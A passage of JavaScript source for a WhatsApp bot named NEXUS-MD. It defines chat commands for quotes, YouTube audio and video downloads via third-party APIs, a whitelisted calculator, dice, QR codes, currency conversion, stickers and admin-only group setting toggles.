      quote = quote.replace(/\\n/g, '\n').replace(/\\"/g, '"');

      // Send the quote
      await sock.sendMessage(from, { 
        text: `💬 *"${quote}"*\n\n— *${author}*`
      });

    } catch (error) {
      console.error('Quote error:', error);

      // Fallback: Prince API
      try {
        const princeUrl = 'https://api.princetechn.com/api/tools/quote';
        const fallbackRes = await fetch(`${princeUrl}?apikey=prince`);
        const fallbackData = await fallbackRes.json();

        let fallbackQuote = fallbackData.result?.quote || fallbackData.quote || fallbackData.text;
        let fallbackAuthor = fallbackData.result?.author || fallbackData.author || 'Unknown';

        if (fallbackQuote) {
          return await sock.sendMessage(from, { 
            text: `💬 *"${fallbackQuote}"*\n\n— *${fallbackAuthor}*`
          });
        }
      } catch (fallbackErr) {
        // Silent fail
      }

      // Fallback: ZenQuotes API (free, no key required)
      try {
        const zenRes = await fetch('https://zenquotes.io/api/random');
        const zenData = await zenRes.json();

        if (zenData && zenData[0]) {
          const q = zenData[0].q || zenData[0].quote;
          const a = zenData[0].a || zenData[0].author || 'Unknown';
          if (q) {
            return await sock.sendMessage(from, { 
              text: `💬 *"${q}"*\n\n— *${a}*`
            });
          }
        }
      } catch (zenErr) {
        // Silent fail
      }

      // Fallback: Another free API
      try {
        const anotherRes = await fetch('https://api.quotable.io/random');
        const anotherData = await anotherRes.json();

        if (anotherData && anotherData.content) {
          const q = anotherData.content;
          const a = anotherData.author || 'Unknown';
          return await sock.sendMessage(from, { 
            text: `💬 *"${q}"*\n\n— *${a}*`
          });
        }
      } catch (anotherErr) {
        // Silent fail
      }

      await sock.sendMessage(from, { 
        text: `⚠️ Quote Error: ${error.message || 'Could not fetch a quote.'}\n\n💡 Try again later.`
      });
    }
  }
});

register({
  name: 'define',
  category: 'INFO',
  description: 'Dictionary definition',
  async execute({ sock, from, text }) {
    if (!text) return sock.sendMessage(from, { text: '❓ Word to define?' });
    try {
      const res = await fetch(`${P_BASE}/search/dictionary?apikey=${P_KEY}&query=${encodeURIComponent(text)}`);
      const data = await res.json();
      if (!data.result) return sock.sendMessage(from, { text: '❌ No definition found.' });
      await sock.sendMessage(from, { text: `📖 *Definition:* ${text}\n\n${data.result}` });
    } catch (e) {
      await sock.sendMessage(from, { text: '⚠️ Define Error: ' + e.message });
    }
  }
});
register({
  name: 'ping',
  aliases: ['p'],
  category: 'MAIN',
  description: 'Check bot speed and system status',
  async execute({ sock, from }) {
    const os = require('os');
    const start = Date.now();
    
    // Initial message to calculate round-trip time
    const sent = await sock.sendMessage(from, { text: '⚡ *NEXUS-MD: MEASURING...*', ...channelContext() });
    
    const end = Date.now();
    const latency = end - start;

    // Calculate RAM usage
    const totalRam = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const freeRam = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const usedRam = (totalRam - freeRam).toFixed(2);

    // Determine speed grade
    let grade = 'Excellent 🟢';
    if (latency > 300) grade = 'Good 🟡';
    if (latency > 700) grade = 'Poor 🔴';

    const uptime = formatUptime(Date.now() - START_TIME);

    let status = `⚡ *NEXUS-MD STATUS*\n\n`;
    status += `🛰️ *Latency:* \`${latency}ms\`\n`;
    status += `📊 *Grade:* ${grade}\n`;
    status += `⏱️ *Uptime:* \`${uptime}\`\n`;
    status += `📟 *RAM:* \`${usedRam}GB\` / \`${totalRam}GB\`\n`;
    status += `🚀 *Host:* \`Railway.app\`\n`;
    status += `📡 *Platform:* \`${os.platform()}\`\n\n`;
    status += `_System is running at optimal capacity._`;

    // Send the detailed status as an edit; fall back to a new message if
    // editing isn't supported/fails, so the command never goes silent.
    try {
      await sock.sendMessage(from, {
        text: status,
        edit: sent.key,
      });
    } catch (e) {
      await sock.sendMessage(from, { text: status, ...channelContext() });
    }
  },
});
register({
  name: 'play',
  aliases: ['song', 'music', 'ytplay', 'ytaudio', 'playv2'],
  category: 'DOWNLOADER',
  description: 'Search and download YouTube audio as MP3 (David Cyril API)',
  async execute({ sock, from, args, prefix, command }) {
    // ==========================================================
    // Check if user provided a query or URL
    // ==========================================================
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🎵 *YouTube Music Player (v2)*\n\nUsage: ${prefix}${command} <song name or URL>\nExample: ${prefix}${command} Alone\n\n*Examples:*\n${prefix}${command} Shape of You\n${prefix}${command} https://www.youtube.com/watch?v=xxxxxxxxxxx\n\n*Note:* Searches YouTube and returns the top result as MP3 audio.` 
      });
    }

    const query = args.join(" ");
    const isUrl = query.includes('youtube.com') || query.includes('youtu.be');

    await sock.sendMessage(from, { 
      text: `🎵 *Searching for:* ${query}` 
    });

    try {
      // ==========================================================
      // Build API URL
      // ==========================================================
      const apiUrl = new URL('https://apis.davidcyril.name.ng/download/ytmp3v2');
      
      if (isUrl) {
        apiUrl.searchParams.append('url', query);
      } else {
        apiUrl.searchParams.append('search', query);
      }

      const response = await fetch(apiUrl.toString(), {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'application/json'
        }
      });

      if (!response.ok) {
        throw new Error(`API returned ${response.status}`);
      }

      const data = await response.json();

      // ==========================================================
      // Extract data from response
      // ==========================================================
      let title = data.result?.title || data.title || data.videoTitle || 'YouTube Audio';
      let artist = data.result?.artist || data.artist || data.channel || 'Unknown';
      let duration = data.result?.duration || data.duration || 'N/A';
      let thumbnail = data.result?.thumbnail || data.thumbnail || data.thumb || '';
      let audioUrl = data.result?.url || data.result?.download_url || data.url || data.download_url;

      // Fallback: try to find any URL in the response
      if (!audioUrl) {
        const jsonString = JSON.stringify(data);
        const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp3|m4a|ogg|wav)/i);
        if (urlMatch) audioUrl = urlMatch[0];
      }

      if (!audioUrl) {
        return await sock.sendMessage(from, { 
          text: `❌ No audio download URL found for "${query}".\n\n💡 Try a different search term or direct URL.` 
        });
      }

      // ==========================================================
      // Send video info with thumbnail
      // ==========================================================
      let infoMsg = `🎵 *${title}*\n`;
      infoMsg += `👤 *Artist:* ${artist}\n`;
      infoMsg += `⏱️ *Duration:* ${duration}\n\n`;
      infoMsg += `⬇️ *Downloading audio...*`;

      if (thumbnail) {
        try {
          await sock.sendMessage(from, {
            image: { url: thumbnail },
            caption: infoMsg
          });
        } catch (thumbErr) {
          await sock.sendMessage(from, { text: infoMsg });
        }
      } else {
        await sock.sendMessage(from, { text: infoMsg });
      }

      // ==========================================================
      // Download the audio
      // ==========================================================
      const audioResponse = await fetch(audioUrl, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });

      if (!audioResponse.ok) {
        throw new Error(`Failed to download audio: ${audioResponse.status}`);
      }

      const audioBuffer = Buffer.from(await audioResponse.arrayBuffer());

      if (audioBuffer.length < 5000) {
        return await sock.sendMessage(from, { 
          text: `❌ Downloaded file is too small. Please try again.` 
        });
      }

      const fileSizeMB = (audioBuffer.length / 1024 / 1024).toFixed(1);

      // ==========================================================
      // Send the audio
      // ==========================================================
      const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'audio';

      try {
        await sock.sendMessage(from, {
          audio: audioBuffer,
          mimetype: 'audio/mpeg',
          fileName: `${safeTitle}.mp3`,
          caption: `🎵 *${title}*\n👤 ${artist}\n📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success*`
        });
      } catch (sendErr) {
        // Fallback: send as document
        await sock.sendMessage(from, {
          document: audioBuffer,
          mimetype: 'audio/mpeg',
          fileName: `${safeTitle}.mp3`,
          caption: `🎵 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
        });
      }

    } catch (error) {
      console.error('Play error:', error);
      await sock.sendMessage(from, { 
        text: `⚠️ Error: ${error.message || 'Could not search or download.'}\n\n💡 Try:\n• ${prefix}${command} Alone\n• ${prefix}${command} Shape of You\n• ${prefix}${command} https://youtube.com/watch?v=xxxxx\n\n💡 Or try again later.` 
      });
    }
  }
});
register({
  name: 'alive',
  category: 'MAIN',
  description: 'Check if the bot is online',
  async execute({ sock, from }) {
    await sock.sendMessage(from, {
      text: `✅ *${BOT_NAME}* is alive and running.\nUptime: ${formatUptime(Date.now() - START_TIME)}`,
    });
  },
});

register({
  name: 'runtime',
  category: 'MAIN',
  description: 'Show bot uptime',
  async execute({ sock, from }) {
    await sock.sendMessage(from, { text: `⏱ Uptime: ${formatUptime(Date.now() - START_TIME)}` });
  },
});
register({
  name: 'playvideo',
  aliases: ['playv', 'ytmp4', 'ytvideo', 'watch', 'vplay'],
  category: 'DOWNLOADER',
  description: 'Search and download YouTube videos (MP4)',
  async execute({ sock, from, args, prefix, command }) {
    if (!args[0]) {
      return await sock.sendMessage(from, { 
        text: `🎬 *Video Player*\n\nUsage: ${prefix}${command} <song name or URL>\nExample: ${prefix}${command} Music Video\n\n*Examples:*\n${prefix}${command} Shape of You\n${prefix}${command} https://youtu.be/60ItHLz5WEA\n\n*Quality:* Best available (up to 1080p)\n*Note:* Videos over 16MB sent as documents.` 
      });
    }

    const query = args.join(" ");
    const isUrl = query.includes('youtube.com') || query.includes('youtu.be');

    await sock.sendMessage(from, { text: `⏳ Searching for "${query}"...` });

    let videoUrl = query;
    let title = 'YouTube Video';
    let thumbnail = '';
    let duration = '';
    let artist = '';

    // ==========================================================
    // STEP 1: If not a URL, search via yt-search
    // ==========================================================
    if (!isUrl) {
      try {
        const yts = require('yt-search');
        const searchResults = await yts(query);
        
        if (!searchResults || !searchResults.videos || searchResults.videos.length === 0) {
          return await sock.sendMessage(from, { 
            text: `❌ No results found for "${query}".\n\n💡 Try a different search term.` 
          });
        }

        const target = searchResults.videos[0];
        videoUrl = target.url;
        title = target.title || 'YouTube Video';
        thumbnail = target.thumbnail || target.image || '';
        duration = target.timestamp || target.duration || '';
        artist = target.author?.name || target.author || '';

      } catch (ytErr) {
        console.warn('yt-search failed:', ytErr.message);
      }
    }

    // Send thumbnail if available
    if (thumbnail) {
      try {
        await sock.sendMessage(from, {
          image: { url: thumbnail },
          caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}${duration ? `⏱️ *Duration:* ${duration}\n` : ''}\n\n⬇️ *Downloading video...*`
        });
      } catch (thumbErr) {
        await sock.sendMessage(from, { 
          text: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}${duration ? `⏱️ *Duration:* ${duration}\n` : ''}\n\n⬇️ *Downloading video...*` 
        });
      }
    }

    // ==========================================================
    // STEP 2: Try PRIMARY API - EliteProTech (MP4)
    // ==========================================================
    try {
      const eliteUrl = `https://eliteprotech-apis.zone.id/ytmp4?url=${encodeURIComponent(videoUrl)}`;
      const eliteRes = await fetch(eliteUrl, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
      });

      if (eliteRes.ok) {
        const eliteData = await eliteRes.json();
        
        let videoDownloadUrl = eliteData.result?.url || eliteData.result?.download_url || 
                               eliteData.url || eliteData.download_url || eliteData.result;

        if (!videoDownloadUrl) {
          const jsonString = JSON.stringify(eliteData);
          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mkv|webm|avi)/i);
          if (urlMatch) videoDownloadUrl = urlMatch[0];
        }

        if (videoDownloadUrl && videoDownloadUrl.startsWith('http')) {
          const videoResponse = await fetch(videoDownloadUrl, {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
          });

          if (videoResponse.ok) {
            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
            if (videoBuffer.length > 5000) {
              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'video';
              const fileName = `${safeTitle}.mp4`;

              // Check if video is too large for WhatsApp (16MB limit)
              if (videoBuffer.length > 16 * 1024 * 1024) {
                await sock.sendMessage(from, {
                  document: videoBuffer,
                  mimetype: 'video/mp4',
                  fileName: fileName,
                  caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to WhatsApp 16MB limit.*`
                });
                return;
              }

              try {
                await sock.sendMessage(from, {
                  video: videoBuffer,
                  mimetype: 'video/mp4',
                  caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (EliteProTech)*`
                });
                return;
              } catch (sendErr) {
                // Fallback: send as document
                await sock.sendMessage(from, {
                  document: videoBuffer,
                  mimetype: 'video/mp4',
                  fileName: fileName,
                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
                });
                return;
              }
            }
          }
        }
      }
    } catch (eliteErr) {
      console.warn('EliteProTech MP4 failed:', eliteErr.message);
    }

    // ==========================================================
    // STEP 3: Fallback API - David Cyril (MP4)
    // ==========================================================
    try {
      const davidUrl = `https://apis.davidcyril.name.ng/play?url=${encodeURIComponent(videoUrl)}&format=mp4`;
      const davidRes = await fetch(davidUrl, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
      });

      if (davidRes.ok) {
        const davidData = await davidRes.json();
        
        let videoDownloadUrl = davidData.result?.url || davidData.result?.download_url || 
                               davidData.url || davidData.download_url || davidData.result;

        if (!videoDownloadUrl) {
          const jsonString = JSON.stringify(davidData);
          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mkv|webm|avi)/i);
          if (urlMatch) videoDownloadUrl = urlMatch[0];
        }

        if (videoDownloadUrl && videoDownloadUrl.startsWith('http')) {
          const videoResponse = await fetch(videoDownloadUrl, {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
          });

          if (videoResponse.ok) {
            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
            if (videoBuffer.length > 5000) {
              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'video';
              const fileName = `${safeTitle}.mp4`;

              if (videoBuffer.length > 16 * 1024 * 1024) {
                await sock.sendMessage(from, {
                  document: videoBuffer,
                  mimetype: 'video/mp4',
                  fileName: fileName,
                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to size limit.*`
                });
                return;
              }

              try {
                await sock.sendMessage(from, {
                  video: videoBuffer,
                  mimetype: 'video/mp4',
                  caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (David Cyril)*`
                });
                return;
              } catch (sendErr) {
                await sock.sendMessage(from, {
                  document: videoBuffer,
                  mimetype: 'video/mp4',
                  fileName: fileName,
                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
                });
                return;
              }
            }
          }
        }
      }
    } catch (davidErr) {
      console.warn('David Cyril MP4 failed:', davidErr.message);
    }

    // ==========================================================
    // STEP 4: Third Fallback - Prince API (MP4)
    // ==========================================================
    try {
      const princeUrl = `https://api.princetechn.com/api/download/ytmp4?apikey=prince&url=${encodeURIComponent(videoUrl)}`;
      const princeRes = await fetch(princeUrl, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
      });

      if (princeRes.ok) {
        const princeData = await princeRes.json();
        
        let videoDownloadUrl = princeData.result?.download_url || princeData.result?.url || 
                               princeData.download_url || princeData.url || princeData.result;

        if (!videoDownloadUrl) {
          const jsonString = JSON.stringify(princeData);
          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mkv|webm|avi)/i);
          if (urlMatch) videoDownloadUrl = urlMatch[0];
        }

        if (videoDownloadUrl && videoDownloadUrl.startsWith('http')) {
          const videoResponse = await fetch(videoDownloadUrl, {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
          });

          if (videoResponse.ok) {
            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
            if (videoBuffer.length > 5000) {
              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'video';
              const fileName = `${safeTitle}.mp4`;

              if (videoBuffer.length > 16 * 1024 * 1024) {
                await sock.sendMessage(from, {
                  document: videoBuffer,
                  mimetype: 'video/mp4',
                  fileName: fileName,
                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to size limit.*`
                });
                return;
              }

              try {
                await sock.sendMessage(from, {
                  video: videoBuffer,
                  mimetype: 'video/mp4',
                  caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (Prince)*`
                });
                return;
              } catch (sendErr) {
                await sock.sendMessage(from, {
                  document: videoBuffer,
                  mimetype: 'video/mp4',
                  fileName: fileName,
                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
                });
                return;
              }
            }
          }
        }
      }
    } catch (princeErr) {
      console.warn('Prince MP4 failed:', princeErr.message);
    }

    // ==========================================================
    // STEP 5: Final Fallback - GiftedTech API
    // ==========================================================
    try {
      const giftedUrl = `https://api.giftedtech.co.ke/api/download/ytmp4?apikey=gifted&url=${encodeURIComponent(videoUrl)}&quality=720p`;
      const giftedRes = await fetch(giftedUrl, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
      });

      if (giftedRes.ok) {
        const giftedData = await giftedRes.json();
        
        let videoDownloadUrl = giftedData.result?.download_url || giftedData.result?.url || 
                               giftedData.download_url || giftedData.url || giftedData.result;

        if (!videoDownloadUrl) {
          const jsonString = JSON.stringify(giftedData);
          const urlMatch = jsonString.match(/https?:\/\/[^\s"']+\.(mp4|mkv|webm|avi)/i);
          if (urlMatch) videoDownloadUrl = urlMatch[0];
        }

        if (videoDownloadUrl && videoDownloadUrl.startsWith('http')) {
          const videoResponse = await fetch(videoDownloadUrl, {
            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
          });

          if (videoResponse.ok) {
            const videoBuffer = Buffer.from(await videoResponse.arrayBuffer());
            if (videoBuffer.length > 5000) {
              const fileSizeMB = (videoBuffer.length / 1024 / 1024).toFixed(1);
              const safeTitle = title.replace(/[^a-zA-Z0-9\s]/g, '').trim() || 'video';
              const fileName = `${safeTitle}.mp4`;

              if (videoBuffer.length > 16 * 1024 * 1024) {
                await sock.sendMessage(from, {
                  document: videoBuffer,
                  mimetype: 'video/mp4',
                  fileName: fileName,
                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB\n\n⚠️ *Sent as document due to size limit.*`
                });
                return;
              }

              try {
                await sock.sendMessage(from, {
                  video: videoBuffer,
                  mimetype: 'video/mp4',
                  caption: `🎬 *${title}*\n${artist ? `👤 *Artist:* ${artist}\n` : ''}📦 *Size:* ${fileSizeMB} MB\n\n✅ *Download Success (GiftedTech)*`
                });
                return;
              } catch (sendErr) {
                await sock.sendMessage(from, {
                  document: videoBuffer,
                  mimetype: 'video/mp4',
                  fileName: fileName,
                  caption: `🎬 *${title}*\n📦 *Size:* ${fileSizeMB} MB`
                });
                return;
              }
            }
          }
        }
      }
    } catch (giftedErr) {
      console.warn('GiftedTech MP4 failed:', giftedErr.message);
    }

    // ==========================================================
    // STEP 6: All APIs failed
    // ==========================================================
    await sock.sendMessage(from, { 
      text: `⚠️ All download methods failed for "${query}".\n\n💡 Try:\n• A different video name\n• A direct YouTube URL\n• Using ${prefix}ytmp4 or ${prefix}ytv (fallback commands)\n• Wait a few minutes and retry\n\n${isUrl ? 'The video might be age-restricted or private.' : ''}` 
    });
  }
});

register({
  name: 'calc',
  aliases: ['calculate', 'math'],
  category: 'TOOLS',
  description: 'Evaluate a math expression, e.g. .calc (12+8)*3/4',
  async execute({ sock, from, text, prefix, command }) {
    if (!text) {
      return sock.sendMessage(from, { text: `🧮 Usage: ${prefix}${command} <expression>\nExample: ${prefix}${command} (12+8)*3/4` });
    }
    // Only allow digits, whitespace, and basic arithmetic characters — no letters,
    // so this can never execute arbitrary JS via the expression string.
    if (!/^[\d\s+\-*/().%]+$/.test(text)) {
      return sock.sendMessage(from, { text: '❌ Only numbers and + - * / % ( ) are allowed.' });
    }
    try {
      const result = Function(`"use strict"; return (${text})`)();
      if (typeof result !== 'number' || !isFinite(result)) throw new Error('Invalid result');
      await sock.sendMessage(from, { text: `🧮 *${text}* = *${result}*` });
    } catch {
      await sock.sendMessage(from, { text: '❌ Could not evaluate that expression.' });
    }
  },
});

register({
  name: 'roll',
  aliases: ['dice'],
  category: 'TOOLS',
  description: 'Roll a dice — .roll [sides] [count]',
  async execute({ sock, from, args }) {
    const sides = Math.max(2, Math.min(1000, parseInt(args[0]) || 6));
    const count = Math.max(1, Math.min(20, parseInt(args[1]) || 1));
    const rolls = Array.from({ length: count }, () => 1 + Math.floor(Math.random() * sides));
    const total = rolls.reduce((a, b) => a + b, 0);
    const text = count === 1
      ? `🎲 You rolled a *${rolls[0]}* (d${sides})`
      : `🎲 Rolls: ${rolls.join(', ')}\n➕ Total: *${total}*`;
    await sock.sendMessage(from, { text });
  },
});

register({
  name: 'flip',
  aliases: ['coinflip', 'coin'],
  category: 'TOOLS',
  description: 'Flip a coin',
  async execute({ sock, from }) {
    const result = Math.random() < 0.5 ? 'Heads 🪙' : 'Tails 🪙';
    await sock.sendMessage(from, { text: `🪙 ${result}` });
  },
});

register({
  name: 'choose',
  aliases: ['pick'],
  category: 'TOOLS',
  description: 'Pick randomly from a list — .choose pizza, sushi, tacos',
  async execute({ sock, from, text, prefix, command }) {
    if (!text) {
      return sock.sendMessage(from, { text: `🤔 Usage: ${prefix}${command} option1, option2, option3` });
    }
    const options = text.split(',').map((o) => o.trim()).filter(Boolean);
    if (options.length < 2) {
      return sock.sendMessage(from, { text: '❓ Give me at least two options, separated by commas.' });
    }
    const pick = options[Math.floor(Math.random() * options.length)];
    await sock.sendMessage(from, { text: `🎯 I choose: *${pick}*` });
  },
});

register({
  name: 'qr',
  aliases: ['qrcode'],
  category: 'TOOLS',
  description: 'Generate a QR code from text or a link',
  async execute({ sock, from, text, prefix, command }) {
    if (!text) {
      return sock.sendMessage(from, { text: `📱 Usage: ${prefix}${command} <text or url>` });
    }
    const url = `https://api.qrserver.com/v1/create-qr-code/?size=400x400&data=${encodeURIComponent(text)}`;
    try {
      await sock.sendMessage(from, { image: { url }, caption: `📱 QR code for: ${text}` });
    } catch (e) {
      await sock.sendMessage(from, { text: '⚠️ Could not generate QR code: ' + e.message });
    }
  },
});

register({
  name: 'currency',
  aliases: ['convert', 'exchangerate'],
  category: 'TOOLS',
  description: 'Convert currency — .currency 100 USD to EUR',
  async execute({ sock, from, args, prefix, command }) {
    if (args.length < 4) {
      return sock.sendMessage(from, { text: `💱 Usage: ${prefix}${command} <amount> <from> to <to>\nExample: ${prefix}${command} 100 USD to EUR` });
    }
    const amount = parseFloat(args[0]);
    const from_ = (args[1] || '').toUpperCase();
    const to = (args[3] || '').toUpperCase();
    if (!amount || !from_ || !to) {
      return sock.sendMessage(from, { text: `💱 Usage: ${prefix}${command} <amount> <from> to <to>` });
    }
    try {
      const res = await fetch(`https://open.er-api.com/v6/latest/${from_}`);
      const data = await res.json();
      const rate = data.rates?.[to];
      if (!rate) return sock.sendMessage(from, { text: `❌ Could not find a rate for ${from_} → ${to}.` });
      const converted = (amount * rate).toFixed(2);
      await sock.sendMessage(from, { text: `💱 ${amount} ${from_} = *${converted} ${to}*\n📊 Rate: 1 ${from_} = ${rate} ${to}` });
    } catch (e) {
      await sock.sendMessage(from, { text: '⚠️ Currency lookup failed: ' + e.message });
    }
  },
});

// ---------- INFO ----------

register({
  name: 'jid',
  category: 'INFO',
  description: 'Get the JID of this chat',
  async execute({ sock, from }) {
    await sock.sendMessage(from, { text: `\`\`\`${from}\`\`\`` });
  },
});

register({
  name: 'owner',
  category: 'INFO',
  description: 'Get owner contact',
  async execute({ sock, from }) {
    const ownerJid = getOwnerJid(sock);
    const ownerNum = ownerJid ? ownerJid.split('@')[0] : 'unknown';
    await sock.sendMessage(from, { text: `👑 Owner: wa.me/${ownerNum}` });
  },
});

register({
  name: 'source',
  category: 'INFO',
  description: 'About this bot',
  async execute({ sock, from }) {
    await sock.sendMessage(from, {
      text: `${BOT_NAME} — a multi-user WhatsApp bot built with Baileys, deployed on Railway.`,
    });
  },
});
register({
  name: 'repo',
  aliases: ['repository', 'sourcecode', 'github', 'source'],
  category: 'MAIN',
  description: 'Get the bot repository and source code information',
  async execute({ sock, from, prefix, command }) {
    const repoInfo = `╭━━━━━━━━━━━━━━━━╮
┃   🤖 *NEXUS-MD REPO*
╰━━━━━━━━━━━━━━━━━╯

📦 *Project:* NEXUS-MD
⚡ *Version:* 2.0.0
📅 *Updated:* ${new Date().toLocaleDateString('en-US', { day: 'numeric', month: 'long', year: 'numeric' })}

🔗 *Pair Link:*
https://web-production-26c60e.up.railway.app/

📂 *Commands:* ${new Set(commands.values()).size}
📊 *Features:* Downloader, AI, Group Admin, Tools, Security

📝 *Description:*
Multi-device WhatsApp bot with advanced features.
Multi-session support • Auto-bio • Channel forwarding

💻 *Stack:*
• Node.js (Baileys)
• Railway.app (Hosting)
• MongoDB/JSON (Storage)

👑 *Owner:* @DEVZUKO

╭━━━━━━━━━━━━━━━━━━━╮
┃    *Quick Links*
╰━━━━━━━━━━━━━━━━━━━╯
🔄 Pair: https://web-production-26c60e.up.railway.app
💬 Support: https://chat.whatsapp.com/GMHYNRFJhyiFhM5h5tE0FX?s=cl&p=a&ilr=0
⛓️Channel: https://whatsapp.com/channel/0029VbCoHP4Id7nGRtKYuA0A

╰━━━━━━━━━━━━━━━━━━━╯
✨ _Made with 🔥 by NEXUS-MD_`;

    // Send as text
    await sock.sendMessage(from, { text: repoInfo });
  }
});
// ---------- TOOLS ----------

register({
  name: 'sticker',
  aliases: ['s'],
  category: 'TOOLS',
  description: 'Reply to / send an image or short video to make a sticker',
  async execute({ sock, msg, from, quoted }) {
    const target = quoted || msg;
    const imageMsg = target?.message?.imageMessage;
    const videoMsg = target?.message?.videoMessage;

    if (!imageMsg && !videoMsg) {
      await sock.sendMessage(from, { text: `📎 Send or reply to an image/video with *${PREFIX}sticker*` });
      return;
    }

    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
    const stream = await downloadContentFromMessage(imageMsg || videoMsg, imageMsg ? 'image' : 'video');
    let buffer = Buffer.from([]);
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);

    const sticker = new Sticker(buffer, {
      pack: BOT_NAME,
      author: 'nexus-md',
      type: StickerTypes.FULL,
      quality: 70,
    });

    const stickerBuffer = await sticker.toBuffer();
    await sock.sendMessage(from, { sticker: stickerBuffer });
  },
});

// ---------- GROUP-SECURITY ----------

async function requireAdminOrOwner({ sock, from, sender, isGroup, msg }) {
  if (msg.key.fromMe) return true; // the linked account itself
  if (!isGroup) {
    await sock.sendMessage(from, { text: '⚠️ This setting only applies inside groups.' });
    return false;
  }
  const admin = await isSenderAdmin(sock, from, sender);
  if (!admin) {
    await sock.sendMessage(from, { text: '❌ Only group admins or the bot owner can change this.' });
    return false;
  }
  return true;
}

function toggleCommand({ name, aliases, settingKey, label, emoji }) {
  register({
    name,
    aliases,
    category: 'GROUP-SECURITY',
    description: `${label} — on/off`,
    async execute(ctx) {
      const { sock, from, args, isGroup } = ctx;
      const ok = await requireAdminOrOwner(ctx);
      if (!ok) return;

      const state = getGroupSettings(from);
      const arg = (args[0] || '').toLowerCase();

      if (!arg || !['on', 'off'].includes(arg)) {
        await sock.sendMessage(from, {
          text: `${emoji} *${label}* is currently *${state[settingKey] ? 'ON' : 'OFF'}*.\nUse: ${PREFIX}${name} on | ${PREFIX}${name} off`,
        });
        return;
      }

      const enabled = arg === 'on';
      setGroupSetting(from, settingKey, enabled);
      await sock.sendMessage(from, {
        text: `${emoji} *${label}* turned *${enabled ? 'ON ✅' : 'OFF ❌'}* for this group.`,
      });
    },
  });
}

toggleCommand({
  name: 'antidelete',
  settingKey: 'antidelete',
  label: 'Antidelete',
  emoji: '🗑️',
});

toggleCommand({
  name: 'antiedit',
  settingKey: 'antiedit',
  label: 'Antiedit',
  emoji: '✏️',
});

toggleCommand({
  name: 'antisticker',
  settingKey: 'antisticker',
  label: 'Antisticker',
  emoji: '🎴',
});

toggleCommand({
  name: 'antigroupmention',
  aliases: ['antitag'],
  settingKey: 'antigroupmention',
  label: 'Antigroupmention',
  emoji: '🚫',
});

toggleCommand({
  name: 'antilink',
  settingKey: 'antilink',
  label: 'Antilink',
  emoji: '🔗',
});

// Auto-react is owner-level (not per-group) so it works in DMs too, not just groups.
register({
  name: 'autoreact',
  category: 'GROUP-SECURITY',
  description: 'React to every incoming message with a random emoji, in DMs and groups (owner only) — on/off',
  async execute({ sock, from, args, msg, sessionId }) {
    if (!msg.key.fromMe) {
      await sock.sendMessage(from, { text: '❌ Owner only — link the account and send this command from it.' });
      return;
    }
    const arg = (args[0] || '').toLowerCase();
    if (!arg || !['on', 'off'].includes(arg)) {
      await sock.sendMessage(from, {
        text: `😄 *Auto-react* is currently *${getGlobalSetting(sessionId, 'autoreact') ? 'ON' : 'OFF'}*.\nUse: ${PREFIX}autoreact on | ${PREFIX}autoreact off`,
      });
      return;
    }
